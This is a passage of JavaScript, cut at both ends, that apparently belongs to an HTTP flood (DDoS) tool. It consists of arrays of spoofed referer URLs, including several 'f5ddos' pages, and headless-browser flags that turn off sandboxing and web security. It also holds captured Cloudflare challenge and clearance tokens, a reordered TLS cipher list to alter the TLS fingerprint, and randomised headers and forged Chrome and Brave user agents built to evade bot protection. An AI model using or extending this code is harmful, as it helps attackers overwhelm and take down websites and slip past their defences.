  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=",
  "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/",
  "http://search.aol.com/aol/search?q=",
  "http://taginfo.openstreetmap.org/search?q=",
  "http://techtv.mit.edu/search?q=",
  "http://validator.w3.org/feed/check.cgi?url=",
  "http://vk.com/profile.php?redirect=",
  "http://www.ask.com/web?q=",
  "http://www.baoxaydung.com.vn/news/vn/search&q=",
  "http://www.bestbuytheater.com/events/search?q=",
  "http://www.bing.com/search?q=",
  "http://www.evidence.nhs.uk/search?q=",
  "http://www.google.com/?q=",
  "http://www.google.com/translate?u=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=",
  "http://www.google.ru/url?sa=t&rct=?j&q=&e/",
  "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
  "http://www.pagescoring.com/website-speed-test/?url=",
  "http://www.reddit.com/search?q=",
  "http://www.search.com/search?q=",
  "http://www.shodanhq.com/search?q=",
  "http://www.ted.com/search?q=",
  "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
  "http://www.usatoday.com/search/results?q=",
  "http://www.ustream.tv/search?q=",
  "http://yandex.ru/yandsearch?text=",
  "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=",
  "http://ytmnd.com/search?q=",
  "https://add.my.yahoo.com/rss?url=",
  "https://careers.carolinashealthcare.org/search?q=",
  "https://check-host.net/",
  "https://developers.google.com/speed/pagespeed/insights/?url=",
  "https://drive.google.com/viewerng/viewer?url=",
  "https://duckduckgo.com/?q=",
  "https://google.com/",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=",
  "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://play.google.com/store/search?q=",
  "https://pornhub.com/",
  "https://r.search.yahoo.com/",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://steamcommunity.com/market/search?q=",
  "https://vk.com/profile.php?redirect=",
  "https://www.bing.com/search?q=",
  "https://www.cia.gov/index.html",
  "https://www.facebook.com/",
  "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
  "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
  "https://www.fbi.com/",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.co.ao/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.com/search?q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=",
  "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=",
  "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=",
  "https://www.npmjs.com/search?q=",
  "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
  "https://www.pinterest.com/search/?q=",
  "https://www.qwant.com/search?q=",
  "https://www.ted.com/search?q=",
  "https://www.usatoday.com/search/results?q=",
  "https://www.yandex.com/yandsearch?text=",
  "https://www.youtube.com/",
  "https://yandex.ru/",
    'http://anonymouse.org/cgi-bin/anon-www.cgi/',
    'http://coccoc.com/search#query=',
    'http://ddosvn.somee.com/f5.php?v=',
    'http://engadget.search.aol.com/search?q=',
    'http://engadget.search.aol.com/search?q=query?=query=&q=',
    'http://eu.battle.net/wow/en/search?q=',
    'http://filehippo.com/search?q=',
    'http://funnymama.com/search?q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=',
    'http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/',
    'http://go.mail.ru/search?mail.ru=1&q=',
    'http://help.baidu.com/searchResult?keywords=',
    'http://host-tracker.com/check_page/?furl=',
    'http://itch.io/search?q=',
    'http://jigsaw.w3.org/css-validator/validator?uri=',
    'http://jobs.bloomberg.com/search?q=',
    'http://jobs.leidos.com/search?q=',
    'http://jobs.rbs.com/jobs/search?q=',
    'http://king-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://louis-ddosvn.rhcloud.com/f5.html?v=',
    'http://millercenter.org/search?q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=',
    'http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=',
    'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/',
    'http://page-xirusteam.rhcloud.com/f5ddos3.html?v=',
    'http://php-hrdevil.rhcloud.com/f5ddos3.html?v=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x&q=',
    'http://ru.search.yahoo.com/search?_query?=l%t=?=?A7x/',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf&q=',
    'http://ru.search.yahoo.com/search_yzt=?=A7x9Q.bs67zf/',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=',
    'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/',
    'http://search.aol.com/aol/search?q=',
    'http://taginfo.openstreetmap.org/search?q=',
    'http://techtv.mit.edu/search?q=',
    'http://validator.w3.org/feed/check.cgi?url=',
    'http://vk.com/profile.php?redirect=',
    'http://www.ask.com/web?q=',
    'http://www.baoxaydung.com.vn/news/vn/search&q=',
    'http://www.bestbuytheater.com/events/search?q=',
    'http://www.bing.com/search?q=',
    'http://www.evidence.nhs.uk/search?q=',
    'http://www.google.com/?q=',
    'http://www.google.com/translate?u=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e&q=',
    'http://www.google.ru/url?sa=t&rct=?j&q=&e/',
    'http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=',
    'http://www.pagescoring.com/website-speed-test/?url=',
    'http://www.reddit.com/search?q=',
    'http://www.search.com/search?q=',
    'http://www.shodanhq.com/search?q=',
    'http://www.ted.com/search?q=',
    'http://www.topsiteminecraft.com/site/pinterest.com/search?q=',
    'http://www.usatoday.com/search/results?q=',
    'http://www.ustream.tv/search?q=',
    'http://yandex.ru/yandsearch?text=',
    'http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=',
    'http://ytmnd.com/search?q=',
    'https://add.my.yahoo.com/rss?url=',
    'https://careers.carolinashealthcare.org/search?q=',
    'https://check-host.net/',
    'https://developers.google.com/speed/pagespeed/insights/?url=',
    'https://drive.google.com/viewerng/viewer?url=',
    'https://duckduckgo.com/?q=',
    'https://google.com/',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=',
    'https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=',
    'https://help.baidu.com/searchResult?keywords=',
    'https://play.google.com/store/search?q=',
    'https://pornhub.com/',
    'https://r.search.yahoo.com/',
    'https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=',
    'https://steamcommunity.com/market/search?q=',
    'https://vk.com/profile.php?redirect=',
    'https://www.bing.com/search?q=',
    'https://www.cia.gov/index.html',
    'https://www.facebook.com/',
    'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
    'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
    'https://www.fbi.com/',
    'https://www.google.ad/search?q=',
    'https://www.google.ae/search?q=',
    'https://www.google.al/search?q=',
    'https://www.google.co.ao/search?q=',
    'https://www.google.com.af/search?q=',
    'https://www.google.com.ag/search?q=',
    'https://www.google.com.ai/search?q=',
    'https://www.google.com/search?q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=',
    'https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=',
    'https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=',
    'https://www.npmjs.com/search?q=',
    'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=',
    'https://www.pinterest.com/search/?q=',
    'https://www.qwant.com/search?q=',
    'https://www.ted.com/search?q=',
    'https://www.usatoday.com/search/results?q=',
    'https://www.yandex.com/yandsearch?text=',
    'https://www.youtube.com/',
    'https://yandex.ru/',
    'https://www.betvictor106.com/?jskey=BBOR1oulRNQaihu%2BdyW7xFyxxf0sxIMH%2BB%2FKe4qvs6S3u89h1BcavwQ%3D',
 ];

 const cookie1 = [
    "--no-sandbox",
    "--disable-setuid-sandbox",
    "--disable-infobars",
    "--disable-logging",
    "--disable-login-animations",
    "--disable-notifications",
    "--disable-gpu",
    "--headless",
    "--lang=ko_KR",
    "--start-maxmized",
    "--ignore-certificate-errors",
    "--hide-scrollbars",
    "--mute-audio",
    "--disable-web-security",
    "--incognito",
    "--disable-canvas-aa",
    "--disable-2d-canvas-clip-aa",
    "--disable-accelerated-2d-canvas",
    "--no-zygote",
    "--use-gl=desktop",
    "--disable-gl-drawing-for-tests",
    "--disable-dev-shm-usage",
    "--no-first-run",
    "--disable-features=IsolateOrigins,site-per-process",
    "--ignore-certificate-errors-spki-list",
    "--user-agent=Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:107.0) Gecko/20110101 Firefox/107.0",
    "?__cf_chl_rt_tk=nP2tSCtLIsEGKgIBD2SztwDJCMYm8eL9l2S41oCEN8o-1702888186-0-gaNycGzNCWU",
    "?__cf_chl_rt_tk=yI__zhdK3yR99B6b9jRkQLlvIjTKu7_2YI33ZCB4Pbo-1702888463-0-gaNycGzNFGU",
    "?__cf_chl_rt_tk=QbxNnnmC8FpmedkosrfaPthTMxzFMEIO8xa0BdRJFKI-1702888720-0-gaNycGzNFHs",
    "?__cf_chl_rt_tk=ti1J.838lGH8TxzcrYPefuvbwEORtNOVSKFDISExe1U-1702888784-0-gaNycGzNClA",
    "?__cf_chl_rt_tk=ntO.9ynonIHqcrAuXZJBTcTBAMsENOYqkY5jzv.PRoM-1702888815-0-gaNycGzNCmU",
    "?__cf_chl_rt_tk=SCOSydalu5acC72xzBRWOzKBLmYWpGxo3bRYeHFSWqo-1702888950-0-gaNycGzNFHs",
    "?__cf_chl_rt_tk=QG7VtKbwe83bHEzmP4QeG53IXYnD3FwPM3AdS9QLalk-1702826567-0-gaNycGzNE9A",
    "?__cf_chl_rt_tk=C9XmGKQztFjEwNpc0NK4A3RHUzdb8ePYIAXXzsVf8mk-1702889060-0-gaNycGzNFNA",
    "?__cf_chl_rt_tk=cx8R_.rzcHl0NQ0rBM0cKsONGKDhwNgTCO1hu2_.v74-1702889131-0-gaNycGzNFDs",
    "?__cf_chl_rt_tk=AnEv0N25BNMaSx7Y.JyKS4CV5CkOfXzX1nyIt59hNfg-1702889155-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=7bJAEGaH9IhKO_BeFH3tpcVqlOxJhsCTIGBxm28Uk.o-1702889227-0-gaNycGzNE-U",
    "?__cf_chl_rt_tk=rrE5Pn1Qhmh6ZVendk4GweUewCAKxkUvK0HIKJrABRc-1702889263-0-gaNycGzNCeU",
    "?__cf_chl_rt_tk=.E1V6LTqVNJd5oRM4_A4b2Cm56zC9Ty17.HPUEplPNc-1702889305-0-gaNycGzNCbs",
    "?__cf_chl_rt_tk=a2jfQ24eL6.ICz01wccuN6sTs9Me_eIIYZc.94w6e1k-1702889362-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=W_fRdgbeQMmtb6FxZlJV0AmS3fCw8Tln45zDEptIOJk-1702889406-0-gaNycGzNE9A",
    "?__cf_chl_rt_tk=4kjttOjio0gYSsNeJwtzO6l1n3uZymAdJKiRFeyETes-1702889470-0-gaNycGzNCfs",
    "?__cf_chl_rt_tk=Kd5MB96Pyy3FTjxAm55aZbB334adV0bJax.AM9VWlFE-1702889600-0-gaNycGzNCdA",
    "?__cf_chl_rt_tk=v2OPKMpEC_DQu4NlIm3fGBPjbelE6GWpQIgLlWzjVI0-1702889808-0-gaNycGzNCeU",
    "?__cf_chl_rt_tk=vsgRooy6RfpNlRXYe7OHYUvlDwPzPvAlcN15SKikrFA-1702889857-0-gaNycGzNCbs",
    "?__cf_chl_rt_tk=EunXyCZ28KJNXVFS.pBWL.kn7LZdU.LD8uI7uMJ4SC4-1702889866-0-gaNycGzNCdA",
    "?__cf_clearance=Q7cywcbRU3LhdRUppkl2Kz.wU9jjRLzq50v8a807L8k-1702889889-0-1-a33b4d97.d3187f02.f43a1277-160.0.0",
    "?__cf_bm=ZOpceqqH3pCP..NLyk5MVC6eHuOOlnbTRPDtVGBx4NU-1702890174-1-AWt2pPHjlDUtWyMHmBUU2YbflXN+dZL5LAhMF+91Tf5A4tv5gRDMXiMeNRHnPzjIuO6Nloy0XYk56K77cqY3w9o=; cf_bm=kIWUsH8jNxV.ERL_Uc_eGsujZ36qqOiBQByaXq1UFH0-1702890176-1-AbgFqD6R4y3D21vuLJdjEdIHYyWWCjNXjqHJjxebTVt54zLML8lGpsatdxb/egdOWvq1ZMgGDzkLjiQ3rHO4rSYmPX/tF+HGp3ajEowPPoSh",
    "?__cf_clearance=.p2THmfMLl5cJdRPoopU7LVD_bb4rR83B.zh4IAOJmE-1702890014-0-1-a33b4d97.179f1604.f43a1277-160.0.0",
    "?__cf_clearance=YehxiFDP_T5Pk16Fog33tSgpDl9SS7XTWY9n3djMkdE-1702890321-0-1-a33b4d97.e83179e2.f43a1277-160.0.0",
    "?__cf_clearance=WTgrd5qAue.rH1R0LcMkA9KuGXsDoq6dbtMRaBS01H8-1702890075-0-1-a33b4d97.75c6f2a1.e089e1cd-160.0.0",
    "?__cf_chl_rt_tk=xxsEYpJGdX_dCFE7mixPdb_xMdgEd1vWjWfUawSVmFo-1702890787-0-gaNycGzNE-U",
    "?__cf_chl_rt_tk=4POs4SKaRth4EVT_FAo71Y.N302H3CTwamQUm1Diz2Y-1702890995-0-gaNycGzNCiU",
    "?__cf_chl_rt_tk=ZYYAUS10.t94cipBUzrOANLleg6Y52B36NahD8Lppog-1702891100-0-gaNycGzNFGU",
    "?__cf_chl_rt_tk=qFevwN5uCe.mV8YMQGGui796J71irt6PzuRbniOjK1c-1702891205-0-gaNycGzNChA",
    "?__cf_chl_rt_tk=Jc1iY2xE2StE8vqebQWb0vdQtk0HQ.XkjTwCaQoy2IM-1702891236-0-gaNycGzNCiU",
    "?__cf_chl_rt_tk=Xddm2Jnbx5iCKto6Jjn47JeHMJuW1pLAnGwkkvoRdoI-1702891344-0-gaNycGzNFKU",
    "?__cf_chl_rt_tk=0bvigaiVIw0ybessA948F29IHPD3oZoD5zWKWEQRHQc-1702891370-0-gaNycGzNCjs",
    "?__cf_chl_rt_tk=Vu2qjheswLRU_tQKx9.W1FM0JYjYRIYvFi8voMP_OFw-1702891394-0-gaNycGzNClA",
    "?__cf_chl_rt_tk=8Sf_nIAkrfSFmtD.yNmqWfeMeS2cHU6oFhi9n.fD930-1702891631-0-gaNycGzNE1A",
    "?__cf_chl_rt_tk=A.8DHrgyQ25e7oEgtwFjYx5IbLUewo18v1yyGi5155M-1702891654-0-gaNycGzNCPs",
    "?__cf_chl_rt_tk=kCxmEVrrSIvRbGc7Zb2iK0JXYcgpf0SsZcC5JAV1C8g-1702891689-0-gaNycGzNCPs",
    ];

 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");

 site = [
    'cross-site',
	'same-origin',
	'same-site',
	'none'
  ];
  
  mode = [
    'cors',
	'navigate',
	'no-cors',
	'same-origin'
  ];
  
  dest = [
    'document',
	'image',
	'embed',
	'empty',
	'frame',
  'script'
  ];

  const type = [
    "text/plain",
    "text/html",
    "application/json",
    "application/xml",
    "multipart/form-data",
    "application/octet-stream",
    "image/jpeg",
    "image/png",
    "audio/mpeg",
    "video/mp4",
    "application/javascript",
    "application/pdf",
    "application/vnd.ms-excel",
    "application/vnd.ms-powerpoint",
    "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    "application/zip",
    "image/gif",
    "image/bmp",
    "image/tiff",
    "audio/wav",
    "audio/midi",
    "video/avi",
    "video/mpeg",
    "video/quicktime",
    "text/csv",
    "text/xml",
    "text/css",
    "text/javascript",
    "application/graphql",
    "application/x-www-form-urlencoded",
    "application/vnd.api+json",
    "application/ld+json",
    "application/x-pkcs12",
    "application/x-pkcs7-certificates",
    "application/x-pkcs7-certreqresp",
    "application/x-pem-file",
    "application/x-x509-ca-cert",
    "application/x-x509-user-cert",
    "application/x-x509-server-cert",
    "application/x-bzip",
    "application/x-gzip",
    "application/x-7z-compressed",
    "application/x-rar-compressed",
    "application/x-shockwave-flash"
   ];

   const Methods = [
    "GET", "HEAD", "POST", "PUT", "DELETE", "CONNECT", "OPTIONS", "TRACE", "PATCH"
  ];
  function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
  }
  const browserVersion = getRandomInt(120, 123);
  const fwfw = ['Google Chrome', 'Brave'];
 const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
     const isBrave = wfwf === 'Brave';
     const acceptHeaderValue = isBrave
        ? 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
        : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
    
 const secGpcValue = isBrave ? "1" : undefined;
  let brandValue;
      if (browserVersion === 120) {
          brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
      } 
      else if (browserVersion === 121) {
          brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
      }
      else if (browserVersion === 122) {
          brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
      }
      else if (browserVersion === 123) {
          brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
      }
      const uap1 = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36 Edg/112.0.1722.58',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/112.0.1722.58',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Edge/20.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Edge/20.0',
